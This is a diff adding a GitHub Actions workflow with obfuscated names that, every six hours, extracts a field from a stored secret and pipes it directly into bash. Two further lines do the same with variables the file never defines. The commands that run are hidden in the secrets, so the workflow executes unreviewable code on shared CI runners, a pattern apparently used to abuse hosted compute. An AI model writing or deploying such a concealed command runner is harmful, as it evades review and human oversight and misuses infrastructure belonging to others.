@@ -1,0 +1,19 @@
+name: zhongxueai3645
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongxueai3645
+        env:
+          d203: ${{ secrets.d203 }}
+        run: |
+          echo $d203 | jq -r .skt35281 | /bin/bash
+          echo $ju5567 | jq -r .k21512 | /bin/bash
+          echo $kzw662 | jq -r .ilg5825 | /bin/bash
+
